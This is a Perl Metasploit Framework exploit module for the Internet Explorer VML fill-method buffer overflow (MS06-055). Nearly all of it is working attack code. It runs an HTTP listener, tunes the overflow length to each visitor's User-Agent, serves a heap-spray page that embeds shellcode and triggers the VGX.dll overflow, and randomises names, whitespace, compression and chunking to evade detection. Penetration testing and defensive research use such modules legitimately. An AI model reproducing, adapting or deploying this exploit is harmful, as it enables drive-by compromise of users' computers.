
##
# This file is part of the Metasploit Framework and may be redistributed
# according to the licenses defined in the Authors field below. In the
# case of an unknown or missing license, this file defaults to the same
# license as the core Framework (dual GPLv2 and Artistic). The latest
# version of the Framework can always be obtained from metasploit.com.
##

package Msf::Exploit::ie_vml_rectfill;

use strict;
use base "Msf::Exploit";
use Pex::Text;
use IO::Socket::INET;
use IPC::Open3;

my $advanced =
  {
	'Gzip'       => [1, 'Enable gzip content encoding'],
	'Chunked'    => [1, 'Enable chunked transfer encoding'],
  };

my $info =
  {
	'Name'           => 'Internet Explorer VML Fill Method Code Execution',
	'Version'        => '$Rev: 3818 $',
	'Authors'        =>
	  [
		'H D Moore <hdm [at] metasploit.com>',
		'Aviv Raff <avivra [at] gmail.com>',
		'Trirat Puttaraksa (Kira) <trir00t [at] gmail.com>',
		'Mr.Niega <Mr.Niega [at] gmail.com>',
		'M. Shirk <shirkdog_list [at] hotmail.com>'
	  ],

	'Description'    =>
	  Pex::Text::Freeform(qq{
		This module exploits a code execution vulnerability in Microsoft Internet Explorer using 
		a buffer overflow in the VML processing code (VGX.dll). This module has been tested on
		Windows 2000 SP4, Windows XP SP0, and Windows XP SP2.
}),

	'Arch'           => [ 'x86' ],
	'OS'             => [ 'win32', 'win2000', 'winxp', 'win2003' ],
	'Priv'           => 0,

	'UserOpts'       =>
	  {
		'HTTPPORT' => [ 1, 'PORT', 'The local HTTP listener port', 8080      ],
		'HTTPHOST' => [ 0, 'HOST', 'The local HTTP listener host', "0.0.0.0" ],
	  },

	'Payload'        =>
	  {
		'Space'    => 1024,
		'BadChars' => "\x00",
		'Keys'     => ['-bind'],
	  },
	'Refs'           =>
	  [
		['MSB', 'MS06-055' ],
		['CVE', '2006-4868' ],
		['BID', '20096' ],
		['OSVDB', '28946' ],
	  ],
	'DefaultTarget'  => 0,
	'Targets'        =>
	  [
		[ 'Windows NT 4.0 -> Windows 2003 SP1', 0x0c0c0c0c ]
	  ],

	'Keys'           => [ 'ie' ]
  };

sub new {
	my $class = shift;
	my $self = $class->SUPER::new({'Info' => $info, 'Advanced' => $advanced}, @_);
	return($self);
}

sub Exploit
{
	my $self = shift;

	my $server = IO::Socket::INET->new(
		LocalHost => $self->GetVar('HTTPHOST'),
		LocalPort => $self->GetVar('HTTPPORT'),
		ReuseAddr => 1,
		Listen    => 1,
		Proto     => 'tcp'
	  );
	my $client;

	if (not defined($server)) {
		$self->PrintLine("[-] Failed to create local HTTP listener on " . $self->GetVar('HTTPPORT'));
		return;
	}

	my $httphost = ($self->GetVar('HTTPHOST') eq '0.0.0.0') ?
	  Pex::Utils::SourceIP('1.2.3.4') :
	  $self->GetVar('HTTPHOST');

	$self->PrintLine("[*] Waiting for connections to http://". $httphost .":". $self->GetVar('HTTPPORT') ."/");

	while (defined($client = $server->accept())) {
		$self->HandleHttpClient(Msf::Socket::Tcp->new_from_socket($client));
	}

	return;
}

sub HandleHttpClient
{
	my $self = shift;
	my $fd   = shift;

	# Set the remote host information
	my ($rport, $rhost) = ($fd->PeerPort, $fd->PeerAddr);

	# Read the HTTP command
	my ($cmd, $url, $proto) = split(/ /, $fd->RecvLine(10), 3);
	my $agent;

	# Read in the HTTP headers
	while ((my $line = $fd->RecvLine(10))) {

		$line =~ s/^\s+|\s+$//g;

		my ($var, $val) = split(/\:/, $line, 2);

		# Break out if we reach the end of the headers
		last if (not defined($var) or not defined($val));

		$agent = $val if $var =~ /User-Agent/i;
	}

	my $buflen = 1024;

	# Windows XP SP2 / 2003 SP1 requires long buffer
	if ($agent =~ /Windows NT 5\.[123]/) {
		$buflen = 65535;
	}

	$self->PrintLine("[*] Client connected from $rhost:$rport...");
	my $res = $fd->Send($self->BuildResponse($self->GenerateHTML($buflen)));
	$fd->Close();
}

sub GenerateHTML {
	my $self   = shift;
	my $buflen = shift;
	my $target = $self->Targets->[$self->GetVar('TARGET')];
	my @vml_elements = qw{ rect roundrect line polyline oval image arc curve };

	my $shellcode = Pex::Utils::JSUnescape($self->GetVar('EncodedPayload')->Payload);
	my $addr_long = unpack('H*', pack('V', $target->[1]));
	my $addr_word = substr($addr_long, 0, 4);
	my $buffer    = ("&#x" . $addr_word . ";")  x $buflen;
	my $xmlns     = Pex::Text::LowerCaseText(int(rand(30)+2));
	my $vmlelem   = $vml_elements[ rand(scalar(@vml_elements)) ];

	my $var_buffer    = Pex::Text::LowerCaseText(int(rand(30)+8));
	my $var_shellcode = Pex::Text::LowerCaseText(int(rand(30)+8));
	my $var_unescape  = Pex::Text::LowerCaseText(int(rand(30)+8));
	my $var_x         = Pex::Text::LowerCaseText(int(rand(30)+8));
	my $var_i         = Pex::Text::LowerCaseText(int(rand(30)+8));

	my $data      = qq|
<html xmlns:${xmlns} = "urn:schemas-microsoft-com:vml" >
<head>
<style> ${xmlns}\\:* { behavior: url(#default#VML) ; } </style>
<body>
<script>

	var ${var_unescape}  = unescape ;
	var ${var_shellcode} = ${var_unescape}( "${shellcode}" ) ;
	
	var ${var_buffer} = ${var_unescape}( "%u${addr_word}" ) ;
	while (${var_buffer}.length <= 0x400000) ${var_buffer}+=${var_buffer} ;

	var ${var_x} = new Array() ;	
	for ( var ${var_i} =0 ; ${var_i} < 30 ; ${var_i}++ ) {
		${var_x}[ ${var_i} ] = 
			${var_buffer}.substring( 0 ,  0x100000 - ${var_shellcode}.length ) + ${var_shellcode} +
			${var_buffer}.substring( 0 ,  0x100000 - ${var_shellcode}.length ) + ${var_shellcode} + 
			${var_buffer}.substring( 0 ,  0x100000 - ${var_shellcode}.length ) + ${var_shellcode} + 		
			${var_buffer}.substring( 0 ,  0x100000 - ${var_shellcode}.length ) + ${var_shellcode} ;
	}

</script>
<${xmlns}:${vmlelem}>
	<${xmlns}:fill method = "$buffer" />
</${xmlns}:${vmlelem}>

</body>
</html>
|;

	# Mangle the whitespace...
	$data =~ s/\s+/RandomSpaces()/ge;

	return $data;
}

sub RandomSpaces {
	my @spaces = ("\x20", "\x09", "\x0a", "\x0d");
	my $res;
	my $len = rand(100)+20;

	while (length($res) < $len) {
		$res .= $spaces[ rand(scalar(@spaces)) ];
	}

	return $res;
}

sub BuildResponse {
	my ($self, $content) = @_;

	my $response =
	  "HTTP/1.1 200 OK\r\n" .
	  "Content-Type: text/html\r\n";

	if ($self->GetVar('Gzip')) {
		$response .= "Content-Encoding: gzip\r\n";
		$content = $self->Gzip($content);
	}
	if ($self->GetVar('Chunked')) {
		$response .= "Transfer-Encoding: chunked\r\n";
		$content = $self->Chunk($content);
	} else {
		$response .= 'Content-Length: ' . length($content) . "\r\n" .
		  "Connection: close\r\n";
	}

	$response .= "\r\n" . $content;

	return $response;
}

sub Chunk {
	my ($self, $content) = @_;

	my $chunked;
	while (length($content)) {
		my $chunk = substr($content, 0, int(rand(10) + 1), '');
		$chunked .= sprintf('%x', length($chunk)) . "\r\n$chunk\r\n";
	}
	$chunked .= "0\r\n\r\n";

	return $chunked;
}

sub Gzip {
	my $self = shift;
	my $data = shift;
	my $comp = int(rand(5))+5;

	my($wtr, $rdr, $err);

	my $pid = open3($wtr, $rdr, $err, 'gzip', '-'.$comp, '-c', '--force');
	print $wtr $data;
	close ($wtr);
	local $/;

	return (<$rdr>);
}
1;

